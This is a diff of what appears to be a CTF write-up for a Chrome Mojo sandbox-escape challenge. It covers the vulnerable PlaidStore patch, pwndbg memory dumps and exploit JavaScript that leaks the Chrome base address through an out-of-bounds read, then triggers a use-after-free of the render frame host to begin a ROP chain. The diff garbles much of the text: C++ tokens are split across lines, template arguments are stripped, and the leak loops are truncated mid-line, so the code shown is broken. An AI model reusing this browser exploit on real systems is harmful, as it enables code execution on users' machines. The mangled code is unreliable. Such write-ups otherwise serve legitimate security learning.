@@ -7,17 +7,7 @@
 ```
 $ ls
 Dockerfile     chrome.zip     flag_printer   mojo_js.zip     plaidstore.diff run.sh         server.py       visit.sh
-```
-
-
-
-```
 timeout 20 ./chrome --headless --disable-gpu --remote-debugging-port=1338 --enable-blink-features=MojoJS,MojoJSTest "$1"
-```
-
-
-
-```
 +++ b/third_party/blink/public/mojom/plaidstore/plaidstore.mojom
 @@ -0,0 +1,11 @@
 +module blink.mojom;
@@ -26,16 +16,11 @@ timeout 20 ./chrome --headless --disable-gpu --remote-debugging-port=1338 --enab
 +interface PlaidStore {
 +
 + // Stores data in the data store
-+ StoreData(string key, array<uint8> data);
++ StoreData(string key, array data);
 +
 + // Gets data from the data store
-+ GetData(string key, uint32 count) => (array<uint8> data);
++ GetData(string key, uint32 count) => (array data);
 +};
-```
-
-
-
-```
 +++ b/content/browser/plaidstore/plaidstore_impl.h
 @@ -0,0 +1,35 @@
 +#include <string>
@@ -47,143 +32,114 @@ timeout 20 ./chrome --headless --disable-gpu --remote-debugging-port=1338 --enab
 +
 +class RenderFrameHost;
 +
-+class PlaidStoreImpl : public blink::mojom::PlaidStore {
++class PlaidStoreImpl : public blink::
+mojom::
+PlaidStore {
 + public:
 + explicit PlaidStoreImpl(RenderFrameHost *render_frame_host);
 +
 + static void Create(
 +     RenderFrameHost* render_frame_host,
-+     mojo::PendingReceiver<blink::mojom::PlaidStore> receiver);
++     mojo::
+PendingReceiver receiver);
 +
 + ~PlaidStoreImpl() override;
 +
 + // PlaidStore overrides:
 + void StoreData(
-+     const std::string &key,
-+     const std::vector<uint8_t> &data) override;
++     const std::
+string &key,
++     const std::
+vector &data) override;
 +
 + void GetData(
-+     const std::string &key,
++     const std::
+string &key,
 +     uint32_t count,
 +     GetDataCallback callback) override;
 +
 + private:
 + RenderFrameHost* render_frame_host_;
-+ std::map<std::string, std::vector<uint8_t> > data_store_;
++ std::
+map<std::
+string, std::
+vector > data_store_;
 +};
 +
 +} // namespace content
-```
-
-
-
-```
-+void PlaidStoreImpl::StoreData(
-+   const std::string &key,
-+   const std::vector<uint8_t> &data) {
++void PlaidStoreImpl::
+StoreData(
++   const std::
+string &key,
++   const std::
+vector &data) {
 + if (!render_frame_host_->IsRenderFrameLive()) {
 +   return;
 + }
 + data_store_[key] = data;
 +}
 +
-+void PlaidStoreImpl::GetData(
-+   const std::string &key,
++void PlaidStoreImpl::
+GetData(
++   const std::
+string &key,
 +   uint32_t count,
 +   GetDataCallback callback) {
 + if (!render_frame_host_->IsRenderFrameLive()) {
-+   std::move(callback).Run({});
++   std::
+move(callback).Run({});
 +   return;
 + }
 + auto it = data_store_.find(key);
 + if (it == data_store_.end()) {
-+   std::move(callback).Run({});
++   std::
+move(callback).Run({});
 +   return;
 + }
-+ std::vector<uint8_t> result(it->second.begin(), it->second.begin() + count);
-+ std::move(callback).Run(result);
++ std::
+vector result(it->second.begin(), it->second.begin() + count);
++ std::
+move(callback).Run(result);
 +}
-```
-
-
-
-```
-+PlaidStoreImpl::PlaidStoreImpl(
++PlaidStoreImpl::
+PlaidStoreImpl(
 +   RenderFrameHost *render_frame_host)
 +   : render_frame_host_(render_frame_host) {}
-```
-
-
-
-```
-+void PlaidStoreImpl::Create(
++void PlaidStoreImpl::
+Create(
 +   RenderFrameHost *render_frame_host,
-+   mojo::PendingReceiver<blink::mojom::PlaidStore> receiver) {
-+ mojo::MakeSelfOwnedReceiver(std::make_unique<PlaidStoreImpl>(render_frame_host),
-+                             std::move(receiver));
++   mojo::
+PendingReceiver receiver) {
++ mojo::
+MakeSelfOwnedReceiver(std::
+make_unique(render_frame_host),
++                             std::
+move(receiver));
 +}
-```
-
-
-
-```
 Binds the lifetime of an interface implementation to the lifetime of the Receiver. When the Receiver is disconnected (typically by the remote end closing the entangled Remote), the implementation will be deleted.
-```
-
-
-
-```
 python -m SimpleHTTPServer
-```
-
-
-
-```
 # set file and read symbol
 file ./chrome
 # set start parameter
-set args --headless --disable-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --enable-blink-features=MojoJS http://127.0.0.1:8000/pwn.html
+set args --headless --disable-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --enable-blink-features=MojoJS http://127.0.0.1:
+8000/pwn.html
 # set follow-fork-mode
 set follow-fork-mode parent
 # just run
 r
-```
-
-
-
-```
 <script src="./mojo/public/js/mojo_bindings.js"></script>
 <script src="./third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
 <script>
- async function test() { 
+ async function test() {
  let p = blink.mojom.PlaidStore.getRemote(true);
  await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
    }
  test()
 </script>
-```
-
-
-
-```
 0x5555591ac4a3 mov edi, 0x28 ► 0x5555591ac4a8 call 0x55555ac584b0 <0x55555ac584b0> 0x5555591ac4ad lea rcx, [rip + 0x635e2ec] 0x5555591ac4b4 mov qword ptr [rax], rcx ; 赋值虚表指针 0x5555591ac4b7 mov qword ptr [rax + 8], rbx ; 赋值render_frame_host指针 0x5555591ac4bb lea rcx, [rax + 0x18]
-```
-
-
-
-```
-pwndbg> frame#0 0x000055555ac584b0 in operator new(unsigned long, std::nothrow_t const&) ()
-```
-
-
-
-```
+pwndbg> frame#0 0x000055555ac584b0 in operator new(unsigned long, std::
+nothrow_t const&) ()
 pwndbg> x/6gx 0x284976549f300x284976549f30: 0x000055555f50a7a0 0x000028497640bd00 ; vtable | render_frame_host_0x284976549f40: 0x0000284976549f48 0x0000000000000000 ; data_store_0x284976549f50: 0x0000000000000000 0x0000000000000000pwndbg> vmmap 0x284976549f30LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x28497627a000 0x284976979000 rw-p 6ff000 0 +0x2cff30
-```
-
-
-
-```
 pwndbg> x/6gx 0x284976549f30
 0x284976549f30: 0x000055555f50a7a0     0x000028497640bd00
 0x284976549f40: 0x00002849765f5b40     0x00002849765f5b40
@@ -202,11 +158,6 @@ pwndbg> x/s 0x0000284976881e10
 pwndbg> vmmap 0x0000284976881e10
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     0x28497627a000     0x284976979000 rw-p   6ff000 0       +0x607e10
-```
-
-
-
-```
 async function Leak()
 {
     let plaidStorePtrList = [];
@@ -220,37 +171,7 @@ async function Leak()
     let u8 = new Uint8Array(leakData)
     let u64 = new BigInt64Array(u8.buffer);
     let vtableAddr = 0;
-    for(let i=0x28/8; i<u64.length; i++) {
-        let highAddr = u64[i]&BigInt(0xf00000000000)
-        let lowAddr = u64[i]&BigInt(0x000000000fff)
-        if((highAddr == BigInt(0x500000000000)) && lowAddr == BigInt(0x7a0)) {
-            vtableAddr = u64[i];
-            renderFrameHostAddr = u64[i+1];
-            break;
-       }
-
-   }
-
-    if(vtableAddr == 0 ) {
-        console.log("[-] no vaild addr found");
-        return;
-   }
-    chromeBaseAddr = vtableAddr - BigInt(0x9fb67a0);
-    console.log("[+] leak chrome base addr: "+hex(chromeBaseAddr));
-    console.log("[+] leak reander frame host addr: "+hex(renderFrameHostAddr));
-}
-Leak();
-```
-
-
-
-```
-b content::RenderFrameHostFactory::Create 0x555559075a52 mov edi, 0xc28 0x555559075a57 call 0x55555ac584b0 <0x55555ac584b0>
-```
-
-
-
-```
+    for(let i=0x28/8; i
 function AddFrame()
 {
     let frame = document.createElement("iframe");
@@ -289,10 +210,10 @@ async function pwn()
         let renderFrameHostSize = 0xc28
         frameBuf = new ArrayBuffer(renderFrameHostSize);
         let frameData8 = new Uint8Array(frameBuf).fill(0x41);
- 
+
      // get the child frame
         let plaidStorePtrList = frame.contentWindow.plaidStorePtrList;
- 
+
      // free the render_frame_host ptr
         frame.remove();
 
@@ -305,13 +226,18 @@ async function pwn()
 
 }
 pwn();
-```
-
-
-
-```
 Thread 1 "chrome" received signal SIGSEGV, Segmentation fault.
-0x00005555591ac1e1 in content::PlaidStoreImpl::StoreData(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, std::__1::vector<unsigned char, std::__1::allocator<unsigned char> > const&) ()
+0x00005555591ac1e1 in content::
+PlaidStoreImpl::
+StoreData(std::
+__1::
+basic_string<char, std::
+__1::
+char_traits<char>, std::
+__1::
+allocator<char> > const&, std::
+__1::
+vector > const&) ()
 ...
  RAX 0x4141414141414141 ('AAAAAAAA')
  RBX 0x28b732be0090 ◂— 0x4141414141414141 ('AAAAAAAA')
@@ -323,11 +249,6 @@ Thread 1 "chrome" received signal SIGSEGV, Segmentation fault.
 
 pwndbg> i r rax
 rax           0x4141414141414141 0x4141414141414141
-```
-
-
-
-```
 function AddFrame()
 {
     let frame = document.createElement("iframe");
@@ -350,28 +271,7 @@ function AddFrame()
                 let u64 = new BigInt64Array(u8.buffer);
                 let vtableAddr = 0;
                 let renderFrameHostAddr = 0;
-                for(let i=0x28/8; i<u64.length; i++) {
-                    let highAddr = u64[i]&BigInt(0xf00000000000)
-                    let lowAddr = u64[i]&BigInt(0x000000000fff)
-                    if((highAddr == BigInt(0x500000000000)) && lowAddr == BigInt(0x7a0)) {
-                        vtableAddr = u64[i];
-                        renderFrameHostAddr = u64[i+1];
-                        break;
-                    }
-                }
-
-                if(vtableAddr == 0 ) {
-                    window.chromeBaseAddr = 0;
-                    return;
-                }
-                chromeBaseAddr = vtableAddr - BigInt(0x9fb67a0);
-                window.chromeBaseAddr = chromeBaseAddr;
-                window.renderFrameHostAddr = renderFrameHostAddr;
-                window.plaidStorePtrList = plaidStorePtrList;
-                return;
-            }
-        Leak();
-        </script>
+                for(let i=0x28/8; i
         `;
       document.body.appendChild(frame);
     return frame;
@@ -389,7 +289,7 @@ async function pwn()
                 break;
            }
        }
-     
+    
      // step 2 prepare the rop chain
         chromeBaseAddr = frame.contentWindow.chromeBaseAddr;
         renderFrameHostAddr = frame.contentWindow.renderFrameHostAddr;
